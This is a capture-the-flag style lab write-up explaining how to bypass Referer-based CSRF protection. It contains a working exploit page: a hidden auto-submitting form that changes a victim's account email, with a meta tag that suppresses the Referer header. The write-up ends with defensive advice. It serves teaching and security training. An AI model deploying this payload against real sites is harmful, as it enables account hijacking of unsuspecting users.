# CSRF where Referer validation can be circumvented

## Lab Description

The application uses the `Referer` header to validate whether a request to change the account email originated from the expected site.

The validation can be bypassed because the application does not perform the validation when the `Referer` header is completely omitted.

## Solution

### 1. Identify the vulnerable request

Go to **My account** and change the email address while intercepting the request in Burp Suite.

The request looks like:

POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=attacker@gmail.com

The request successfully changes the account email.

### 2. Test the Referer validation

Send the request to **Burp Repeater**.

The application checks the `Referer` header.

A request containing an appropriate Referer is accepted, while an invalid Referer is rejected.

The key observation is that the Referer validation is not applied when the `Referer` header is completely absent.

### 3. Create the CSRF exploit

Go to the **Exploit server** and create an HTML page containing an automatically submitted form.

Use:

<html>
<body>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@gmail.com">
    </form>

    <script>
        document.forms[0].submit();
    </script>

    <meta name="referrer" content="no-referrer">
</body>
</html>

The important part is:

<meta name="referrer" content="no-referrer">

This prevents the browser from sending the `Referer` header with the cross-site request.

### 4. Store and deliver the exploit

Click **Store** on the Exploit Server.

Then click **Deliver exploit to victim**.

When the victim visits the exploit:

1. The hidden form is automatically submitted.
2. A POST request is sent to `/my-account/change-email`.
3. The browser omits the `Referer` header.
4. The application's Referer validation is bypassed.
5. The victim's email address is changed to the attacker-controlled email.

### 5. Verify the lab

Return to **My account** and verify that the email address has been changed.

The lab should then be marked as **Solved**.

## Vulnerability Explanation

The application relies on the `Referer` header as a CSRF defense.

However, the validation logic does not reject requests when the `Referer` header is missing.

By using:

<meta name="referrer" content="no-referrer">

the attacker can make the browser omit the header entirely.

The application therefore receives a state-changing request without a Referer and fails to enforce its CSRF protection.

## Key Takeaway

Referer-based CSRF protection must correctly handle requests where the `Referer` header is missing.

A secure application should not simply skip validation when the header is absent. Stronger defenses, such as unpredictable CSRF tokens and appropriate SameSite cookie settings, should be used.
